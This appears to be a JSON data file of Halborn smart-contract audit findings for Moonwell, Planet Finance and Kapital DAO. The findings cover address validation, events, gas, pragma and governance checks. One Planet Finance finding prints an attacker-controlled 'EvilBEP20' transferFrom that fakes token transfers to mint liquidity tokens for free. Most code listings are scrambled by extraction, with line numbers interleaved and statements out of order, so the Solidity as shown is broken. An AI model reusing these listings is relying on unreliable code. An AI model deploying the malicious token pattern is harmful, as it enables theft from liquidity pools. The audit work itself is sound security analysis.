        "body": "The Token Sale contract has address fields in multiple functions. These functions are missing address validations. Each address should be val- This is also considered a best idated and checked to be non-zero. practice. During testing, it has been found that some of these inputs are not protected against using the address(0) as the target address. Code Location: Listing 5: TokenSaleDistributorProxy.sol (Lines 18,37) function setPendingAdmin ( address newAdmin ) public adminOnly { * Accept admin transfer from the current admin to the new . */ require ( msg . sender == pendingAdmin && pendingAdmin != } /* * pendingAdmin = newAdmin ; function acceptPendingAdmin () public { 18 19 20 21 22 23 24 25 26  address (0) , \" Caller must be the pending admin \" ); 27 28 29 30 31 32 33 34 35  contract address */ 36 37  public adminOnly { admin = pendingAdmin ; pendingAdmin = address (0) ; /* * } * Request a new implementation to be set for the contract . * * @param newImplementation New contract implementation function setPendingImplementation ( address newImplementation ) 23 pendingImplementation = newImplementation ; 38 39 40 } Recommendation: It is recommended to validate that each address input is non-zero. Remediation Plan: SOLVED: The Moonwell Team solved this issue by implementing zero address checks. Commit ID: Commit ID 24 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENTS FOR ADMIN ONLY FUNCTIONS THAT CHANGE CRITICAL PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
        "body": "Admin-only functions that change critical parameters should emit events. Events allow you to capture changed parameters so that tools/interfaces off-chain can register those changes. Code Location: Listing 6: TokenSaleDistributor.sol function setTokenAddress ( address newTokenAddress ) external require ( tokenAddress == address (0) , \" Address already set \" ) tokenAddress = newTokenAddress ; 1  adminOnly { 2  ; 3 4 } Listing 7: TokenSaleDistributorProxy.sol function setPendingImplementation ( address newImplementation ) } /* * pendingImplementation = newImplementation ; * Accept pending implementation change */ 1  public adminOnly { 2 3 4 5 6 7 8 require ( msg . sender == pendingImplementation &&  pendingImplementation != address (0) , \" Only the pending  implementation contract can call this \"); 9 10 11 12 implementation = pendingImplementation ; pendingImplementation = address (0) ; function acceptPendingImplementation () public { } 25 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add events to all admin functions that change critical parameters. Remediation plan: SOLVED: The Moonwell team solved the issue by adding events following the above recommendation. Commit ID: Commit ID 26 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Low"
        ]
    },
    {
        "title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES TO 0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
        "body": "Since i is an uint256, it is already initialized to 0. reassigns the 0 to i which wastes gas. uint256 i = 0 Code Location: TokenSaleDistributor.sol  Line 157: for (uint i = 0; i < recipients.length; i += 1){ Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended not to initialize uint256 variables to 0 to save gas. For example, use instead: for (uint256 i; i < recipients.length; ++i){. Remediation Plan: SOLVED: The Moonwell Team solved this issue by removing initialization. Commit ID: Commit ID 27 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Low"
        ]
    },
    {
        "title": "USING ++I CONSUMES LESS GAS THAN I+=1 IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
        "body": "In the loop below, the variable i is incremented using i+=. It is known that, in loops, using ++i costs less gas per iteration than i+=1. Code Location: Listing 8 TokenSaleDistributor . sol ::31 => for ( uint i ; i < allocations [ msg 1  . sender ]. length ; i += 1) { 2  recipient ]. length ; i += 1) { 3  recipient ]. length ; i += 1) { 4  recipient ]. length ; i += 1) { 5  recipient ]. length ; i += 1) { 6  recipient ]. length ; i += 1) { 7  . length ; i += 1) { 8  length ; i += 1) { TokenSaleDistributor . sol ::59 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::71 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::83 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::95 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::107 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::157 => for ( uint i = 0; i < recipients TokenSaleDistributor . sol ::180 => for ( uint i ; i < recipients . Risk Level: Likelihood - 1 Impact - 1 28 Proof of Concept: For example, based on the following test contract: Listing 9: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i +=1) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in gas costs: Risk Level: Likelihood - 1 Impact - 1 29 Recommendation: It is recommended to use ++i instead of i+=1 to increment the value of a uint variable within a loop. This does not just apply to the iterator variable. It also applies to increments made within the loop code block. Remediation Plan: SOLVED: The Moonwell Team solved this issue by following the above rec- ommendation. Commit ID: Commit ID 30 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Informational"
        ]
    },
    {
        "title": "CACHING THE LENGTH IN THE FOR LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
        "body": "The solidity compiler will always read the length of the array during each iteration.  If it is a storage array, this is an additional sload operation (100 additional extra gas (EIP-2929) for each iteration except the first)  If it is a memory array, this is an extra mload operation (3 addi- tional gas for each iteration except the first),  If it is a calldata array, it is an extra calldataload operation (3 additional gas for each iteration except the first). Code Location: Listing 10 TokenSaleDistributor . sol ::31 => for ( uint i ; i < allocations [ msg 1  . sender ]. length ; i += 1) { 2  recipient ]. length ; i += 1) { 3  recipient ]. length ; i += 1) { 4  recipient ]. length ; i += 1) { 5  recipient ]. length ; i += 1) { 6  recipient ]. length ; i += 1) { 7  . length ; i += 1) { 8  length ; i += 1) { TokenSaleDistributor . sol ::59 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::71 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::83 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::95 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::107 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::157 => for ( uint i = 0; i < recipients TokenSaleDistributor . sol ::180 => for ( uint i ; i < recipients . 31 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Caching expensive state variables would prevent re-reading from storage. Listing 11 1 uint length = arr . length ; 2 for ( uint i = 0; i < length ; i ++) { 3 4 } // do something that doesn 't change arr . length Remediation Plan: SOLVED: The Moonwell Team solved this issue by caching arrays. Commit ID: Commit ID 32 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Informational"
        ]
    },
    {
        "title": "REVERT STRING SIZE OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
        "body": "Shortening the revert strings to fit within 32 bytes will decrease de- ployment time gas and decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one addi- tional mstore, along with additional overhead to calculate memory offset, etc. Code Location: Listing 12: TokenSaleDistributor.sol 206 function becomeImplementation ( TokenSaleDistributorProxy proxy )  external { 207 require ( msg . sender == proxy . admin () , \" Only proxy admin can  change the implementation \"); 208 209 } proxy . acceptPendingImplementation () ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Shorten the revert strings to fit within 32 bytes. That will affect gas optimization. 33 Remediation Plan: ACKNOWLEDGED: The Moonwell Team acknowledged this issue. This is a long- tail gas estimation issue, and the Moonwell Team would rather have clean error messages than fix gas on a revert the user could have detected. 34 3.10 (HAL-10) MISSING CHECKS FOR NON-ZERO TRANSFER VALUE CALLS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Informational"
        ]
    },
    {
        "title": "TRANSFERRED AMOUNT VERIFICATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In order to keep track of users shares in pools, a corresponding amount of liquidity pool tokens is minted to liquidity providers. The exact amount to be minted is calculated based on the declared amount of BEP20 tokens added to the pool. In the addLiquidityPair function Planet Finance use safeTransferFrom from the TransferHelper library to handle the token transfer. This function calls transferFrom in the token contract to actually execute the transfer. However, since the actual amount transferred ie. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom BEP20 token with the transferFrom function modified in such a way that it does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. Code Location: Attacker-controlled example BEP20 token contract Listing 1: EvilBEP20.sol (Lines 10) ) 1 function transferFrom ( address from , 2 address to , 3 uint256 value 4 5 6 7 8 9 10 11 12 public override returns ( bool ) { value = 1; require ( value <= _balances [ from ]) ; require ( value <= _allowed [ from ][ msg . sender ]) ; 16 require ( to != address (0) ) ; _balances [ from ] = _balances [ from ]. sub ( value ); _balances [ to ] = _balances [ to ]. add ( value ); _allowed [ from ][ msg . sender ] = _allowed [ from ][ msg . sender ]. sub ( value ); emit Transfer ( from , to , value ); return true ; 13 14 15 16 17 18 19 20 } PlanetRouter.sol Line #23 Listing 2: PlanetRouter.sol (Lines 25) 23 function safeTransferFrom ( address token , address from , address to , uint value ) internal { // bytes4 ( keccak256 ( bytes (' transferFrom ( address , address , uint256 ) ')) ) ; ( bool success , bytes memory data ) = token . call ( abi . encodeWithSelector (0 x23b872dd , from , to , value )) ; require ( success && ( data . length == 0 || abi . decode ( data , ( bool ))) , ' TransferHelper : TRANSFER_FROM_FAILED '); 24 25 26 27 } PlanetRouter.sol Line #442 Listing 3: PlanetRouter.sol (Lines 456) 442 function addLiquidity ( 443 444 445 446 447 448 449 450 451 ) external virtual override ensure ( deadline ) returns ( uint amountA address tokenA , address tokenB , uint amountADesired , uint amountBDesired , uint amountAMin , uint amountBMin , address to , uint deadline , uint amountB , uint liquidity ) { ( amountA , amountB ) = _addLiquidity ( tokenA , tokenB , amountADesired , amountBDesired , amountAMin , amountBMin ); address pair = PlanetLibrary . pairFor ( factory , tokenA , tokenB ); 452 453 17 454 455 456 457 } TransferHelper . safeTransferFrom ( tokenA , msg . sender , pair , amountA ); TransferHelper . safeTransferFrom ( tokenB , msg . sender , pair , amountB ); liquidity = IPlanetPair ( pair ). mint ( to ); Risk Level: Likelihood - 2 Impact - 5 Recommendation: Whenever tokens are transferred, the delta of the previous (before trans- fer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: MITIGATED: Planet.Finance team proposes remediate this by listing only those pairs on their website which adhere to BEP20 standard and are Thus this is not an issue within the contract and verified by them. also not a threat to the users investment unless they do trade off the website. The issue is reclassified as LOW. 18 ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "As a result, The Owner of the contract is usually the account which deploys the contract. the Owner is able to perform some privileged actions. In the AquaStrategy-4BELT.sol smart contracts, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Code Location: AquaStrategy-PCS.sol Line #1 Listing 4: AquaStrategy-PCS.sol (Lines 1335) 1335 1336 1337 1338 function renounceOwnership () public virtual onlyOwner { emit OwnershipTransferred ( _owner , address (0) ) ; _owner = address (0) ; } AquaStrategy-4BELT.sol Line #1 Listing 5: AquaStrategy-4BELT.sol (Lines 1326) 1326 1327 1328 1329 function renounceOwnership () public virtual onlyOwner { emit OwnershipTransferred ( _owner , address (0) ) ; _owner = address (0) ; } 19 AquaToken.sol Line #1 Listing 6: AquaToken.sol (Lines 636) 636 637 638 639 function renounceOwnership () public virtual onlyOwner { emit OwnershipTransferred ( _owner , address (0) ) ; _owner = address (0) ; } Risk Level: Likelihood - 2 Impact - 5 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. AquaStrategy-4BELT.sol Line #1 Listing 7: AquaStrategy-4BELT.sol (Lines 3) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } Remediation Plan: SOLVED: In the constructor parameter, the ownership is transferred to the farm contract at the time of deployment and the farm contract cannot call this function. In addition, Planet.Finance team implements multi-signature wallets. 20 ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "PlanetRouter.sol contract use the floating pragma >=0.5.0. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Reference: ConsenSys Diligence - Lock pragmas Code Location: PlanetRouter.sol Line #1 Listing 8: PlanetLibrary.sol (Lines 277) 277 pragma solidity >=0.5.0;  This is an example where the floating pragma is used. ^0.5.0. Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider lock the pragma version known bugs for the compiler version. Therefore, it is recommended not to use floating pragma in the production. Apart from just locking the pragma version in the code, the sign (>= ) need to be removed. it is possible locked the pragma fixing the version both in truffle-config.js if you use the Truffle framework and 21 in hardhat.config.js if you use HardHat framework for the deployment. Remediation Plan: SOLVED: Pragma will be locked before deploying the contract. 22 ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF MINIMUM THRESHOLD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "When modifying the MinTimeToWithdraw variable, a check is made in the code which is that the new value must always be smaller than the old value, the problem here is that this variable will always be decreasing and if by mistake the value 0 is injected we cant modify the value of newMinTimeToWithdraw by a value greater than 0. Code Location: AquaStrategy-AQUA.sol Line #1 Listing 9: AquaStrategy-AQUA.sol (Lines 2419) 2419 2420 2421 require ( newMinTimeToWithdraw <= minTimeToWithdrawUL , \" too high \" ); emit minTimeToWithdrawChanged ( minTimeToWithdraw , newMinTimeToWithdraw ); minTimeToWithdraw = newMinTimeToWithdraw Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended performing a limit after the verification is done to check the new value and compare it with 900 seconds which is the value where the miner can manipulate the block.timestamp 23 Remediation Plan: ACKNOWLEDGED: Planet.Finance team considers that this is the expected behaviour, the lower the threshold the better for investors. 24 ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "FEE LIMIT DEFINITION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "During the tests, Halborn Team noticed that on the _mintFee function, limits are not defined. Code Location: PlanetFactory.sol Line #338 Listing 10: PlanetFactory.sol (Lines 338) 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 function _mintFee ( uint112 _reserve0 , uint112 _reserve1 ) private returns ( bool feeOn ) { address feeTo = IPlanetFactory ( factory ). feeTo () ; feeOn = feeTo != address (0) ; uint _kLast = kLast ; // gas savings if ( feeOn ) { if ( _kLast != 0) { uint rootK = Math . sqrt ( uint ( _reserve0 ). mul ( _reserve1 )) ; uint rootKLast = Math . sqrt ( _kLast ); if ( rootK > rootKLast ) { uint numerator = totalSupply . mul ( rootK . sub ( rootKLast )) . mul (12) ; uint denominator = rootK . mul (13) . add ( rootKLast . mul (12) ) ; uint liquidity = numerator / denominator ; if ( liquidity > 0) _mint ( feeTo , liquidity ); } } } else if ( _kLast != 0) { kLast = 0; } } 25 Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended define maximum and minimum fee range on the related function. Remediation Plan: ACKNOWLEDGED: Planet.Finance team defines a fixed percentage of fees which goes to the developers and that depends on the transaction amount. They consider that a fee limit is not necessary. 26 ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The contracts PlanetFactory.sol, use block.timestamp. The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: PlanetFactory.sol Line #1 Listing 11: PlanetFactory.sol (Lines 188) 187 function permit ( address owner , address spender , uint value , uint deadline , uint8 v , bytes32 r , bytes32 s) external { 188 189 require ( deadline >= block . timestamp , ' Planet : EXPIRED '); bytes32 digest = keccak256 ( PlanetRouter.sol Line #1 Listing 12: PlanetRouter.sol (Lines 400) 399 400 401 402 modifier ensure ( uint deadline ) { require ( deadline >= block . timestamp , ' PlanetRouter : EXPIRED '); _ ; } Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, 27 days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: RISK ACCEPTED: Planet.Finance team considers acceptable the use of block .timestamp. ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "FOR LOOP OVER DYNAMIC ARRAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Calls inside a loop might lead to a denial-of-service attack. The function discovered is a for loop on variable pid that iterates up to the poolInfo length . If this integer is evaluated at extremely large numbers,this can cause a DoS. Code Location: AquaFarm.sol Line #1 Listing 13: AquaFarm.sol (Lines 1568,1569) uint256 length = poolInfo . length ; for ( uint256 pid = 0; pid < length ; ++ pid ) { 1566 function massUpdatePools () public { 1567 1568 1569 1570 1571 updatePool ( pid ); } } PlanetRouter.sol Line #1 28 Listing 14: PlanetRouter.sol (Lines 341) 341 for ( uint i ; i < path . length - 1; i ++) { 342 ( uint reserveIn , uint reserveOut ) = getReserves ( factory , path [ i ], path [ i + 1]) ; amounts [ i + 1] = getAmountOut ( amounts [i ], reserveIn , reserveOut ); 343 344 345 } } } Listing 15: PlanetRouter.sol (Lines 352) 352 353 354 355 for ( uint i = path . length - 1; i > 0; i - -) { ( uint reserveIn , uint reserveOut ) = getReserves ( factory , path [ i - 1] , path [i ]) ; amounts [ i - 1] = getAmountIn ( amounts [ i], reserveIn , reserveOut ); } Risk Level: Likelihood - 2 Impact - 3 Recommendation: If possible, use pull over push strategy for external calls. Remediation Plan: ACKNOWLEDGED: Planet.Finance team considers that pool length will never be high enough. So, practically it is unlikely. 29 ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "ADDRESS VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Address validation is missing in many functions in which user supplied input is assigned to state variables directly. This could lead to irrecoverable loss of tokens or sensitive contract features. Code Location: AquaStrategy_4BELT.sol Line #2340 Listing 16: AquaStrategy_4BELT.sol (Lines 2342,2347,2348) 2340 function changeFeeAddressSetter ( address payable _newFeeAddressSetter ) public { require ( _msgSender () == feeAddressesSetter ,\" Access Denied \" ); feeAddressesSetter = _newFeeAddressSetter ; 2341 2342 2343 } 2344 2345 function changeFeeAddress ( address _depositFeeAddress , address _withdrawFeeAddress ) public { require ( _msgSender () == feeAddressesSetter ,\" Access Denied \" ); depositFeeAddress = _depositFeeAddress ; withdrawFeeAddress = _withdrawFeeAddress ; 2346 2347 2348 2349 } functions Also and AquaStrategy_AQUA.sol and AquaStrategy_PCS.sol. changeFeeAddressSetter AquaStrategy_4BELT.sol Line #2247 Listing 17: AquaStrategy_4BELT.sol 2247 wbnbAddress = _addresses [0]; 2248 govAddress = _addresses [1]; 2249 aquaFarmAddress = _addresses [2]; 2250 AQUAAddress = _addresses [3]; ChangeFeeAddress in 30 2251 2252 wantAddress = _addresses [4]; 2253 token0Address = _addresses [5]; 2254 token1Address = _addresses [6]; 2255 earnedAddress = _addresses [7]; 2256 2257 farmContractAddress = _addresses [8]; 2258 pid = _pid ; 2259 isCAKEStaking = _isCAKEStaking ; 2260 isSameAssetDeposit = _isSameAssetDeposit ; 2261 isAquaComp = _isAquaComp ; 2262 2263 uniRouterAddress = _addresses [9]; 2264 earnedToAQUAPath = _earnedToAQUAPath ; 2265 earnedToToken0Path = _earnedToToken0Path ; 2266 earnedToToken1Path = _earnedToToken1Path ; 2267 token0ToEarnedPath = _token0ToEarnedPath ; 2268 token1ToEarnedPath = _token1ToEarnedPath ; 2269 2270 controllerFee = _controllerFee ; 2271 rewardsAddress = _addresses [10]; 2272 buyBackRate = _buyBackRate ; 2273 buyBackAddress = _addresses [11]; 2274 entranceFeeFactor = _entranceFeeFactor ; 2275 withdrawFeeFactor = _withdrawFeeFactor ; 2276 2277 belt4PoolAddress = _belt4PoolAddress ; 2278 feeAddressesSetter = _msgSender () ; 2279 transferOwnership ( aquaFarmAddress ); Also constructor functions in changeFeeAddressSetter and ChangeFeeAddress in AquaStrategy _AQUA.sol and AquaStrategy_PCS.sol. AquaFarm.sol Line #1720 Listing 18: AquaFarm.sol (Lines 1721) 1720 function changeAQUAaddress ( address _newAddress ) public onlyOwner { 1721 1722 } AQUA = _newAddress ; PlanetRouter.sol Line #404 31 Listing 19: PlanetRouter.sol (Lines 405,406) 404 constructor ( address _factory , address _WETH ) public { 405 406 407 } factory = _factory ; WETH = _WETH ; Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation whenever user-supplied input is assigned to state variables. Ideally, all input should be validated against whitelists. Also, consider implementing relevant setter functions for particularly sensitive variables. Remediation Plan: ACKNOWLEDGED: Planet.Finance team considers that if this happens, they still can change the fees as they can make low level calls through the timelock. 32 ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENT HANDLER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the Planet.Finance contract the some of functions do not emit event after the progress. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. PlanetFactory.sol Line #~488 Listing 20: PlanetFactory.sol (Lines 488,493) 488 489 490 491 492 493 494 495 496 function setFeeTo ( address _feeTo ) external { require ( msg . sender == feeToSetter , ' Planet : FORBIDDEN '); feeTo = _feeTo ; } function setFeeToSetter ( address _feeToSetter ) external { require ( msg . sender == feeToSetter , ' Planet : FORBIDDEN '); feeToSetter = _feeToSetter ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. 33 Remediation Plan: RISK ACCEPTED: Planet.Finance team accepts the risk. 34 3.10 (HAL-10) IGNORED RETURN VALUES - LOW ",
        "labels": [
            "Halborn",
            "Planet_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "PROPOSAL LACKS MULTIPLE IMPORTANT LOGIC CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In Governance.sol contracts, the propose function lacks the multiple logical checks listed below. - Missing to check if the length of the provided targets is equal to values, data length or not. Thus allowing the incorrect submission of the proposals. - No maximum length of targets is defined, which leads to too many actions in a proposal. - No logic is implemented in the proposer if the proposer already has an active or pending proposal in the system before adding a new proposal. - If a description argument is missing from the proposal, it should be used to log the description of the proposal. - Insufficient event emitting, only emitting msg.sender, latestProposalID , and timestamp instead, all essential arguments supplied to the function. Code Location: Listing 1: Governance.sol 138 139 140 141 142 143 144 145 146 function propose ( address [] memory targets , uint256 [] memory values , bytes [] memory data , bool [] memory isDelegateCall , WeightSources memory weightSources ) external returns ( uint256 ) { // Ensure msg . sender has enough voting weight ( uint256 weightKAP , uint256 weightLP ) = getWeights (  weightSources ); 147 148 149 150 require ( weightKAP + convertLP ( weightLP ) >= threshold , \" Governance : Insufficient weight \" ); 15 151 // Make sure haven 't already created a proposal within  cooldown period , Propose CoolDown 152 153 154 uint256 timestamp = block . timestamp ; require ( timestamp >= latestPropose [ msg . sender ] +  proposeCooldown , 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 \" Governance : Propose Cooldown \" ); // Add new proposal latestProposalID ++; Proposal storage proposal = proposals [ latestProposalID ]; proposal . transactParamsHash = getTransactParamsHash ( targets , values , data , isDelegateCall ); proposal . proposeTime = SafeCast . toUint64 ( timestamp ); proposal . priceCumulativeLast = _cumulative () ; // Update msg . sender 's latestProposal latestPropose [ msg . sender ] = timestamp ; emit ProposalCreated ( msg . sender , latestProposalID ,  timestamp ); 174 175 } return latestProposalID ; Risk Level: Likelihood - 4 Impact - 3 Recommendation: Consider adding require checks to ensure array lengths are validated, add a description argument to the above function, and emit the same to log the proposal description for readability; it also emits the events for the remaining arguments, similar to the code shared below. In addition, 16 it is recommended to implement logic to check the proposal status (for example, the status of the proposal could be Pending, Active, Canceled, Defeated, Succeeded, Queued, Expired, Executed, etc.) to the msg.sender, before adding a new proposal. Listing 2 function propose ( ) external returns ( uint256 ) { address [] memory targets , uint256 [] memory values , bytes [] memory data , bool [] memory isDelegateCall , WeightSources memory weightSources , string memory description 1 2 3 4 5 6 7 8 9 ... 10 require ( targets . length > 0 && targets . length == values . length &&  targets . length == data . length && targets . length == isDelegateCall .  length , \" Governor : proposal function information arity mismatch \"); 11 require ( targets . length <= max_operation , \" Governor : too many  actions \" ); 12 ... 13 emit ProposalCreated ( msg . sender , latestProposalID , timestamp ,  targets , values , data , isDelegateCall , weightSources , description )  ; 14 ... Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit 35fb92524b83ff8197a7127f7c9819317ac7ea92. As a result, the team added additional logical checks to the propose function, set proposeCooldown to 3 days (instead of 0 before) to protect against proposal spam, and added a proposal description field and relevant information to the event emitted. Furthermore, the team claims that the use of proposeCooldown is suffi- cient because fast origin-address change is prohibited by the staking requirement and the new delegation-change procedure. Also, the team does not want to limit the target length, as different function calls will use 17 significantly different amounts of gas. Finally, the team claims that the front-end UI will include features such as estimated gas usage and estimated transaction success or failure. Listing 3: Updated propose // Ensure msg . sender has enough voting weight ( uint256 weightKAP , uint256 weightLP ) = getWeights ( address [] memory targets , uint256 [] memory values , bytes [] memory data , string memory description , WeightSources memory weightSources ) external returns ( uint256 ) { require ( function propose ( 1 2 3 4 5 6 7 8 9  weightSources ); 10 11 12 13 14  cooldown period , Propose CoolDown 15 16 17  proposeCooldown , 18 19 20 21 22 23  Invalid data \"); 24  data \" ); 25  description \"); 26 27 28 29 30 31 32 33 targets , values , data weightKAP + convertLP ( weightLP ) >= threshold , \" Governance : Insufficient weight \" ); // Make sure haven 't already created a proposal within uint256 timestamp = block . timestamp ; require ( timestamp >= latestPropose [ msg . sender ] + \" Governance : Propose Cooldown \" ); // Logic check on proposal data uint256 targetsLength = targets . length ; require ( targetsLength > 0, \" Governance : Invalid data \"); require ( targetsLength == values . length , \" Governance : require ( targetsLength == data . length , \" Governance : Invalid require (!( bytes ( description ). length == 0) , \" Governance : No // Add new proposal latestProposalID ++; Proposal storage proposal = proposals [ latestProposalID ]; proposal . transactParamsHash = getTransactParamsHash ( 18 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 ); proposal . proposeTime = SafeCast . toUint64 ( timestamp ); proposal . priceCumulativeLast = _cumulative () ; // Update msg . sender 's latestProposal latestPropose [ msg . sender ] = timestamp ; emit ProposalCreated ( msg . sender , latestProposalID , timestamp , targets , values , data , description ); return latestProposalID ; } 19 ",
        "labels": [
            "Halborn",
            "PlayGround_Labs_Kapital_DAO",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
